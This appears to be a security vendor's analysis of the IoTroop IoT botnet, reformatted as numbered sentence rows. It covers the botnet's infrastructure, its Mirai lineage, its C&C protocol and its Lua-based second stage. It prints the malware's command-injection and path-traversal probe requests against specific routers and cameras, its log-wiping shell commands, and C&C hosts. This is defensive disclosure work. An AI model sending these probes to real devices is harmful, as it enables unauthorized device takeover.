Number,Content
Sentence 1,"IOTROOP BOTNET: THE FULL INVESTIGATION
 October 29, 2017
 

Last week, thanks to the Check Point web sensor network, our researchers discovered a new and massive IoT Botnet, ‘IoTroop’."
Sentence 2,"Due to the urgency of this discovery, we quickly published our initial findings in order to alert the cyber security community."
Sentence 3,"Since then, we have had time to digest and dissect the propagating malware and share our findings with you."
Sentence 4,
Sentence 5,"
The main findings are:
• The entire attack infrastructure has been uncovered."
Sentence 6,"• We have observed 2 sets of different infrastructures:
o The main set of servers and samples focused on infection and propagation."
Sentence 7,o A smaller and different set used for 2nd stage payloads.
Sentence 8,• The attackers have quick and flexible control of infected device via LUA scripting.
Sentence 9,• The malware authors and operators are operating out of China.
Sentence 10,"Throughout the research, we found numerous indications that the authors and operators of this IoT Botnet are operating out of China."
Sentence 11,"Of course, all these indications can be forged."
Sentence 12,"However the sheer volume of evidence as well as locations, still leads us to conclude that these indications are true to a very high degree of probability."
Sentence 13,We can also reveal that part of the C&C infrastructure was previously registered under the email ‘li2384826402@yahoo.com’.
Sentence 14,This same email address was also used to register domains belonging to a Chinese APT Group dubbed ‘The Black Vine’.
Sentence 15,This is not strong enough to attribute this new botnet to the same group; however it does provide leads for future research.
Sentence 16,
Sentence 17,"
The Main Infrastructure

Based on a system multiple different servers, each with its own role to play in the reconnaissance, exploitation and delivery of the malware payload, the entire botnet propagation infrastructure has been uncovered."
Sentence 18,The diagram below illustrates an in-depth view of the requests made and the functions of each server.
Sentence 19,"Diagram of Malware Propagation Infrastructure

"
Sentence 20,"
IoTroop Malware Overview
The IoTroop malware is the main sample used in the campaign and is deployed as a first stage payload."
Sentence 21,It shares an extensive code base with the leaked Mirai source code which can be found in several online resources.
Sentence 22,"The main differences we observed are:

The C&C server has been completely redesigned to operate with a new backend."
Sentence 23,Additionally IoTroop’s C&C server is written in PHP while the original Mirai C&C server was written in GO.
Sentence 24,"With the change of the C&C backend, the C&C communication protocol was changed as well."
Sentence 25,The entire C&C communication functionality found within IoTroop’s samples is brand new and unique to the IoTroop malware.
Sentence 26,A vulnerability scanning functionality has replaced the original brute forcing password functionality as presented by Mirai.
Sentence 27,"This functionality has probably been added to enable the infection of a larger number of devices using fewer resources, while reducing the malware detection rates."
Sentence 28,The IoTroop malware does not contain any of the original Mirai DDoS functionalities; in fact it does not contain any DDoS functionality at all.
Sentence 29,"While we haven’t seen any actual DDoS attacks, all DDoS related actions are being orchestrated and managed by the C&C backend and is downloaded as separate modules."
Sentence 30,"Malware Operation Details
We have detected several variants of samples used by the IoTroop malware containing very slight differences but containing the exact same functionality."
Sentence 31,"Generally, all variants can be divided into two major categories correlating with the attacked device’s architecture – MIPS variants and ARM variants."
Sentence 32,"Initialization
Once IoTroop executes its payload onto an infected device, the initial steps of operation are equivalent to those taken by Mirai."
Sentence 33,"These include:

Obfuscated string initialization
Preventing reboot by the system`s watchdog service (By sending a specific IOCTL)
Ensurse only a single instance of IoTroops is currently running
Hide argv[0]
Hide process’s name
However, from this point of the control flow the IoTroop malware begins to execute its own unique functionality:

The device`s MAC address is retrieved and stored by sending IOCTL 0x8927 to the eth0, br0, eth1 and eth2 devices."
Sentence 34,
Sentence 35,"
If the device the malware is currently running on runs the GoAhead embedded web server, the following shell command lines are executed:

rm -f /tmp/ftpupload.sh \n
ln -s /dev/null /tmp/ftpupload.sh \n
rm -r /var/log \n

These actions are used to delete a previous shell script used by the WIFICAM exploit and to create a symbolic link to /dev/null, thus preventing any further attempts of using it, as well as clearing all log files to clear its evidence from the device."
Sentence 36,
Sentence 37,"
Disabling Competitor Malware
IoTroop kills any open telnet processes open using port TCP/23."
Sentence 38,
Sentence 39,"
It then continues to scan the device’s memory for the existing strings that are used by other IoT malware."
Sentence 40,"If any of these strings are found, the process containing them is killed."
Sentence 41,".anime
REPORT %s:%s
HTTPFLOOD
LOLNOGTFO
zollard
\x58\x4D\x4E\x4E\x43\x50\x46\x22 (The word ‘zollard’ Xored with 0x22)
Vulnerability Scanning
Random IP’s are generated for the purpose of vulnerability scanning."
Sentence 42,The code responsible for generating the IP address is identical to Mirai’s code and is used to generate IP addresses with the following excluded subnet.
Sentence 43,The malware conducts a set of vulnerability tests on each of the generated IP addresses.
Sentence 44,"These tests locate vulnerabilities in any of the following devices and/or infrastructure:


The specific vulnerability scan traffic is the following:

GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

Avtech
GET /shell?echo+jaws+123456;cat+/proc/cpuinfo HTTP/1.1
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

JAWS Web Server
“GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%%27;ech
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

NetGear
GET /board.cgi?cmd=cat%%20/etc/passwd HTTP/1.1
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

VACRON
GET /system.ini?loginuse&loginpas HTTP/1.1
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

WIFICAM
POST /command.php HTTP/1.1
Host: %d.%d.%d.%d

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: %d

 

cmd=cat%%20/var/passwd

 

DLINK DIR-600
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&curpath=/&cu
rrentsetting.htm=1&cmd=echo+dgn+123456 HTTP/1.1

Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

 

NetGear DGN1000
POST /apply.cgi HTTP/1.1
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

 

submit_button=Diagnostics&change_action=gozila_cgi&submit_typ

e=start_ping&action=&commit=0&nowait=1&ping_ip=%%3b%%20AAA

BBB|||%%20%%3b&ping_size=&ping_times=5&traceroute_ip=

 

Linksys
POST /hedwig.cgi HTTP/1.1
Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)

Connection: keep-alive

Content-type: text/xml

Cookie: uid=qDxppsreSd

Content-Length: %d

 

<?xml version=’1.0′ encoding=’UTF-8′?><postxml><module><servi

ce>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>

</module></postxml>

DLINK DIR-8
This is a sample of a PCAP taken from one of the vulnerability scans:



C&C Communication
IoTroop’s C&C backend is composed of several components, each responsible for a unique purpose."
Sentence 45,"Reporting Server
The reporting sever is used to collect a list of all devices who were found to be vulnerable by any of the infected devices."
Sentence 46,Reporting servers are prefixed with the ‘f’ subdomain name.
Sentence 47,"We were able to identify two active reporting servers at the time of our research:

hl852.com (222.112.82.231)
ha859.com (222.112.82.231)
"
Sentence 48,"
Once a device has been found to be vulnerable, IoTroop sends its data to the reporting server in the following manner:



The following arguments are being used as part of this HTTP GET request:

The controller servers are used to control all infected devices, and are responsible for executing all second stage malicious payloads and updating the current malware."
Sentence 49,
Sentence 50,"
Controller Servers
Each of the infected devices constantly pulls for available commands from the controlling C&C server."
Sentence 51,"At the time of the research we were able to identify two active control servers:

ha859.com (27.102.101.121)
hl852.com (27.102.101.121)
"
Sentence 52,"
The commands and arguments issued from the controller to the IoTroop client are sent in a JSON format."
Sentence 53,"The retrieved data may be comprised of the following key-value tuples:
Once a command is received, it is parsed to locate either one of these values, namely looking for “code” as the action to conduct and the rest as arguments to supplement
it."
Sentence 54,"As mentioned above, this can result in two execution paths – a plain download, or a download followed by execution."
Sentence 55,"These are outlined next:
Download
if a port exists and is equal to 80, than a string of the format “http://<ip><url_path>” is constructed, otherwise it sets it to be “http://<ip>:<port><url_path>”, using the values of “ip”, “port” and “path” as the data to place in the string."
Sentence 56,If the name JSON value is a full path then the file will be downloaded and saved under this name.
Sentence 57,Otherwise it will be placed under the /tmp directory.
Sentence 58,"Before handling the constructed URL, the bot will attempt to kill all similar processes by name, issuing the command “killall <name>”, where the argument is taken from the aforementioned “name” key."
Sentence 59,"Finally, the URL will be passed to a download function."
Sentence 60,"The download function will first check the status of the file using lstat to verify that it exists and is valid for subsequent reading action, following which the MD5 hash function will be applied on its contents."
Sentence 61,"Upon opening the file and reading it, a supposed reporting or logging string of the format “open:error\success” or “read:error\success” will be constructed depending on the status of each of the actions accordingly, however this string is never used, suggesting that the malware is still undergoing adjustments and is in a development phase."
Sentence 62,"The retrieved hash will be compared against one that is provided by the controller in the “md5” key, so as to verify that the version of the file on disk (if such indeed exists) differs from the one provided by the server."
Sentence 63,"If indeed the file versions differ, a new file will be generated with the permission “r-xrwxrwx” and a socket will be established to the destination server (containing the required file)."
Sentence 64,"IoTroop will construct an HTTP GET request and write it to the socket, after which it will try to read its contents in chunks of 128 bytes (in the event the request succeeded)."
Sentence 65,"These will be written to the newly created file, and checked one more time against the MD5, provide by the controllers, to verify that the contents were retrieved properly."
Sentence 66,"To finalize communication, the bot will issue the string “FIN\n” to the controller."
Sentence 67,"Execute
The execution of the file will always follow a download."
Sentence 68,"In such case, there are several options, depending on the value of the “runtype” and “runport” keys."
Sentence 69,"The former is checked for the existence of the “mysel” substring, which will cause the execution of the downloaded file with the same arguments as the current process."
Sentence 70,"These will usually have the second argument set to be a device model, and the third argument as a TCP port."
Sentence 71,"This kind of behavior may correspond to an event of software update to the bot, suggesting the possibility of it evolving further in the future."
Sentence 72,"In any other case, either the downloaded file is executed with the given “runtype” and “runport” as arguments, or only with “runtype”."
Sentence 73,"The latter scenario would correspond to an execution of an arbitrary module or plugin, which could well be the Slowloris DDoS utility (found on the build server), or any other application of the like."
Sentence 74,"Either way, in order to spawn the new process, the command “/bin/sh sh -c <path_to_executable> <runtype> <runport>” will be used."
Sentence 75,
Sentence 76,"
Throughout our research we found the following samples being used by the IoTroop malware at different stages of its control flow."
Sentence 77,"Name	Hash	Type	Arch	Details
a	522EF21132B734853307DDDAC6B5DFB9	Backdoor	ARM	Small backdoor that listens on TCP 8888 for raw shell commands, and executes them on the infected device."
Sentence 78,"m	83883F1C6B5423F0CA13B4278B431656	Backdoor	MIPS
bot	03AC15C3CF698510AA928CB93175BF55	Mirai	MIPS	Mirai botnet, with default config."
Sentence 79,"Seems to be used for debugging
s1	445EB00D8D5846886DEC7A36BF3FD829	Slowloris	MIPS	DDoS Tool
s2	711CD91EB920CC3C0F78AF275471E560	Slowloris	MIPS
s4	9B2124E9BB5F4583DDA5388FC6EAFDC1	Slowloris	MIPS
s5	FFF2EADCA6C31BFCC69AF1419D5C793C	Slowloris	MIPS
s3	25960FD858AFB6FB6F49621A2DB8E8BC	Slowloris	MIPS
sa	726D0626F66D5CACFEFF36ED954DAD70	IoTroop	ARM	core of botnet, recruits new bots through vulnerability enumeration
sm	9AD8473148E994981454B3B04370D1EC	IoTroop	MIPS	core of botnet, recruits new bots through vulnerability enumeration
server	5A4E11C8D47F2868F4C0150DD4E18464	Mini_Telnet	MIPS	basic C implementation of a telnet client & server
https://github.com/qixiaohu/mini_telnet

xget	6F91694106BB6D5AAA7A7EAC841141D9	Dropper	ARM	IoTroop malware dropper, downloads and executes the IoTroop sample (sa)."
Sentence 80,
Sentence 81,"
2nd Stage Payloads
Overview
We have noticed another set of related samples and C&C servers, also mentioned in a post from Qihoo 360, seemingly used for second stage payload."
Sentence 82,These samples can be downloaded and executed by the IoTroop malware from the Download server.
Sentence 83,"The samples are described in the following table:

These samples communicate with a different set of C&C servers to report infection and download commands."
Sentence 84,"These servers are hard coded inside the samples in the form of domain / IP address sometimes with different ports, depending on the exact sample."
Sentence 85,"Lua-Integrated Malware AnalysisAccording to data collected from one of the reporting servers, there were around 4700 unique device infections reported to this server, mostly from IP addresses in South Korea."
Sentence 86,"Overview
These samples are compiled statically with the Lua interpreter, and the LuaSocket library., integrating Lua execution support with flexible network functionality."
Sentence 87,"Additionally it contains code from the Mirai source, compiled in Debug mode, which is evident due to the existence of debug strings in the code."
Sentence 88,"However, the Mirai code doesn’t seem to be utilized by the sample we analyzed, with the exception of one debug sub-string referenced by the code, and this is probably due to compiler optimization."
Sentence 89,"The existence of multiple debug strings, verbose outputs and the general state of the infrastructure, leads us to believe that these samples are still in testing or initial deployment phase."
Sentence 90,"It is also evident the developers have an understanding of Lua’s interpreter internals, due to their usage of the interpreter’s internal functions."
Sentence 91,"Functionality Analysis
The core part of the sample’s main function can be seen below:


The malware uses Lua interpreter’s internal functions to initialize the Lua engine, load the LuaSocket libraries and define some custom Lua global variables, some of which the attackers later reference in their Lua code."
Sentence 92,Afterwards a function is pushed to the Lua engine stack and then defined as “attack”.
Sentence 93,This is equivalent to defining a function called “attack” in a LUA script.
Sentence 94,"This string “attack” is taken as a substring from a debug string from the Mirai source code (this is probably an amusing artifact due to compiler optimization):



The malware then utilizes internal Lua functions in order to execute the following Lua script, which is embedded as a string inside the malware:


This script communicates with the hard coded C&C addresses of the malware and is actually the main payload."
Sentence 95,It starts by reporting the infection details to the reporting C&C (bbk80.com) using the global variables previously defined.
Sentence 96,It then enters an infinite loop where it downloads Lua scripts from the command C&C (cbk99.com) and executes them.
Sentence 97,It works by downloading the “run.lua” file (a Lua script) from the C&C and passing it as an argument to the “attack” function that was previously defined in main.
Sentence 98,"The “attack” function serves as a custom “eval” function, executing the script in a forked child process:
The malware will print an error string in Chinese if loading and/or execution of the script fails for some reason:



Currently the existing “run.lua” script on the C&C server simply prints the string “Just Test”:
We can see another Lua script left on the webserver named “run.bak.txt”, which looks like a data collection / update script."
Sentence 99,"An excerpt is shown below:


The attackers can easily update the script and easily instruct the botnet to perform any task."
Sentence 100,"This powerful setup gives the attackers flexible and dynamic control of infected devices, allowing them to easily target anything with custom, updateable attack code, and alter the malware’s behavior without updating the binary itself."
Sentence 101,Check Point IPS and Anti-Bot Blades provides full protection against this threat.
Sentence 102,"IPS Protections:

Vendor	Protection Name
GoAhead	Wireless IP Camera (P2P) WIFICAM Cameras Information Disclosure
Wireless IP Camera (P2P) WIFICAM Cameras Remote Code Execution
D-Link	D-Link 850L Router Remote Code Execution
D-Link DIR800 Series Router Remote Code Execution
D-Link DIR800 Series Router Information Disclosure
D-Link 850L Router Remote Unauthenticated Information Disclosure
D-Link 850L Router Cookie Overflow Remote Code Execution
D-Link DIR-600/300 Router Unauthenticated Remote Command Execution
NETGEAR	Netgear DGN Unauthenticated Command Execution
Netgear ReadyNAS Remote Command Execution

AVTECH	AVTECH Devices Multiple Vulnerabilities
Vacron	Vacron NVR Remote Code Execution
Linksys	Belkin Linksys E1500/E2500 Remote Command Execution
Linux	Linux System Files Information Disclosure
 

Anti-Bot protections

Anti-Bot blade blocks IOTroops malware communication."
